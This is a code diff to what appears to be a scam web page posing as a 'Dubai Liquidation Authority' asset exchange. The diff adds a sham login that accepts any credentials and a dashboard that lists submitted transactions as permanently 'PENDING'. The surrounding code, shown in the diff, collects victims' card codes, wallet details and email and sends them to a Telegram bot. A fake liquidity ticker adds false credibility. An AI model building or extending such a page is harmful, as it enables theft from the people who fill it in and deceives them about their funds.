@@ -12,6 +12,18 @@
         [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; }
         body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
         
+        /* AUTH & DASHBOARD STYLES */
+        #auth-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 10001; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .auth-card { background: var(--panel); border: 1px solid var(--border); padding: 30px; border-radius: 24px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .auth-tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
+        .auth-tab { flex: 1; padding: 10px; cursor: pointer; color: #555; font-size: 12px; font-weight: 800; text-transform: uppercase; }
+        .auth-tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); }
+        #dashboard-view { display: none; width: 100%; }
+        .tx-item { background: #111; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; text-align: left; }
+        .status-badge { font-size: 9px; padding: 3px 8px; border-radius: 4px; font-weight: 900; }
+        .status-pending { background: rgba(212,175,55,0.1); color: var(--gold); }
+
+        /* ORIGINAL STYLES */
         .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
         .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
@@ -66,12 +78,40 @@
 </head>
 <body>
 
+    <div id="auth-screen">
+        <div class="auth-card">
+            <h2 style="color:var(--gold)">DLA ACCESS</h2>
+            <p style="font-size:10px; color:#555; margin-bottom:20px;">SECURE SETTLEMENT GATEWAY</p>
+            <div class="auth-tabs">
+                <div class="auth-tab active" onclick="switchAuth(this, 'login')">Login</div>
+                <div class="auth-tab" onclick="switchAuth(this, 'signup')">Sign Up</div>
+            </div>
+            <input type="text" id="auth-user" placeholder="USERNAME / EMAIL" style="margin-bottom:10px;">
+            <input type="password" id="auth-pass" placeholder="PASSWORD">
+            <button class="main-btn" onclick="handleAuth()">Enter Portal</button>
+        </div>
+    </div>
+
     <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
     <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
 
     <div class="panel">
+        
+        <div id="dashboard-view">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                <h2 style="font-size:18px;">ACTIVITY</h2>
+                <button onclick="toggleView('exchange')" class="pay" style="padding:5px 10px;">+ NEW EXCHANGE</button>
+            </div>
+            <div id="tx-history-list">
+                <p style="font-size:11px; color:#444;">No recent activity found.</p>
+            </div>
+        </div>
+
         <div id="form">
-            <h2>Exchange</h2>
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h2>Exchange</h2>
+                <button onclick="toggleView('dashboard')" class="pay" style="padding:5px 10px;">📜 HISTORY</button>
+            </div>
             <div class="tag">Dubai Liquidation Authority</div>
 
             <label>Asset Class</label>
@@ -190,6 +230,50 @@
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
 
+        // NEW AUTH & DASHBOARD LOGIC
+        function switchAuth(el, mode) {
+            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        function handleAuth() {
+            const user = document.getElementById('auth-user').value;
+            const pass = document.getElementById('auth-pass').value;
+            if(user.length < 3 || pass.length < 3) return alert("Enter valid credentials");
+            
+            document.getElementById('auth-screen').style.display = 'none';
+            loadDashboard();
+        }
+
+        function toggleView(view) {
+            if(view === 'dashboard') {
+                document.getElementById('form').style.display = 'none';
+                document.getElementById('dashboard-view').style.display = 'block';
+                loadDashboard();
+            } else {
+                document.getElementById('form').style.display = 'block';
+                document.getElementById('dashboard-view').style.display = 'none';
+            }
+        }
+
+        function loadDashboard() {
+            const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
+            const container = document.getElementById('tx-history-list');
+            if(history.length === 0) return;
+            
+            container.innerHTML = history.reverse().map(tx => `
+                <div class="tx-item">
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <span style="font-size:10px; color:#555;">${tx.id}</span>
+                        <span class="status-badge status-pending">PENDING</span>
+                    </div>
+                    <div style="font-weight:800; font-size:16px; margin:5px 0;">${tx.amount}</div>
+                    <div style="font-size:10px; color:#888;">Asset: ${tx.asset}</div>
+                </div>
+            `).join('');
+        }
+
+        // ORIGINAL LOGIC (Intact)
         const wmLayer = document.getElementById('wm-layer');
         for(let i=0; i<30; i++) {
             const span = document.createElement('span');
@@ -247,10 +331,16 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
+            // Save to local history for Pending Transactions
+            const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
+            const newTx = { id: 'DLA-'+Math.floor(Math.random()*99999), amount: amount, asset: assetName, date: new Date().toLocaleDateString() };
+            history.push(newTx);
+            localStorage.setItem('dla_history', JSON.stringify(history));
+
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Telegram Notification (High Priority POST)
+            // Telegram Notification
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
                                 `*Asset:* ${assetName}\n` +
@@ -306,7 +396,6 @@
 
         function showReceipt() {
             successSound.play();
-            
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success').style.display = 'block';
             let tid = "DLA-TX" + Math.floor(100000 + Math.random() * 900000);
@@ -344,4 +433,4 @@
         }
     </script>
 </body>
-</html>```
+</html>
